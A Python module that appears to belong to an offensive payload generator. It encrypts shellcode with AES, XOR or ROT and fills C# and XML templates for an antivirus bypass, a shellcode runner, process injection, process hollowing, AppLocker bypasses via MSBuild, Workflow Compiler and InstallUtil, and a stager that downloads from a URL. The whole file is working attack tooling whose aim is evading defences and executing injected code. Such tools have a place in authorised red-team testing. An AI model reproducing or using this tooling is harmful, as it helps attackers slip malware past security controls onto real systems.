import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

from .utils import *

path = os.path.dirname(__file__)

def bytes_to_cs(data):
    hex_bytes = [f"0x{b:02X}" for b in data]
    return "{" + ", ".join(hex_bytes) + "}"

def delay(args, code):
    if (args.delay):
        return code.replace('{{DELAY}}', str(args.delay))
    else:
        return code

def encrypt(args, code, shellcode):
    if args.encrypt:
        if args.encrypt.upper() == 'AES':
            key = os.urandom(16)
            cipher = AES.new(key, AES.MODE_CBC)
            shellcode = cipher.encrypt(pad(shellcode, AES.block_size))
            iv = cipher.iv
            return code.replace('{{AES_KEY}}', bytes_to_cs(key)).replace('{{AES_IV}}', bytes_to_cs(iv)), shellcode 
        elif args.encrypt.upper() == 'XOR':
            key = int.from_bytes(os.urandom(1))
            return code.replace('{{XOR_KEY}}', hex(key)), xor_encrypt(shellcode, key)
        elif args.encrypt.upper() == 'ROT':
            key = int.from_bytes(os.urandom(1))
            return code.replace('{{ROT_KEY}}', hex(key)), rot_encrypt(shellcode, key)
    else:
        return code, shellcode

def av_bypass(args, shellcode):
    with open(os.path.join(path, 'templates/cs/av_bypass.cs'), 'r') as f:
        code = f.read()
    payload = delay(args, code)
    payload, shellcode = encrypt(args, payload, shellcode)
    return payload.replace('{{SHELLCODE}}', bytes_to_cs(shellcode))

def shellcode_runner(args, shellcode):
    with open(os.path.join(path, 'templates/cs/shellcode_runner.cs'), 'r') as f:
        code = f.read()
    payload = av_bypass(args, shellcode)
    return code.replace('{{PAYLOAD}}', payload)

def process_injection(args, shellcode):
    with open(os.path.join(path, 'templates/cs/process_injection.cs'), 'r') as f:
        code = f.read()
    payload = av_bypass(args, shellcode)
    process_name = os.path.splitext(os.path.basename(args.process.replace('\\','/')))[0]
    return code.replace('{{PAYLOAD}}', payload).replace('{{PROCESS}}', process_name)

def process_hollowing(args, shellcode):
    with open(os.path.join(path, 'templates/cs/process_hollowing.cs'), 'r') as f:
        code = f.read()
    payload = av_bypass(args, shellcode)
    process = args.process
    process = process.replace("/", "\\").replace("\\", "\\\\")
    return code.replace('{{PAYLOAD}}', payload).replace('{{PROCESS}}', process)

def applocker(args, url):
    xml_code=""
    cs_code=""
    if args.applocker.lower() == 'msbuild':
        with open(os.path.join(path, 'templates/xml/msbuild.xml'), 'r') as f:
            xml_code = f.read()
            xml_code = xml_code.replace('{{URL}}', url)
    if args.applocker.lower() == 'workflow_compiler':
        with open(os.path.join(path, 'templates/cs/workflow_compiler.cs'), 'r') as f:
            cs_code = f.read()
            cs_code = cs_code.replace('{{URL}}', url)
        with open(os.path.join(path, 'templates/xml/workflow_compiler.xml'), 'r') as f:
            xml_code = f.read()
            xml_code = xml_code.replace('{{PATH}}', args.applocker_path+'\\build.cs')

    if args.applocker.lower() == 'installutil':
        with open(os.path.join(path, 'templates/cs/installutil.cs'), 'r') as f:
            cs_code = f.read()
            cs_code = cs_code.replace('{{URL}}', url)
    return cs_code, xml_code

def stager(args, url, shellcode):
    with open(os.path.join(path, 'templates/cs/stager.cs'), 'r') as f:
        code = f.read()
    code, shellcode = encrypt(args, code, shellcode)
    return code.replace('{{URL}}', url), shellcode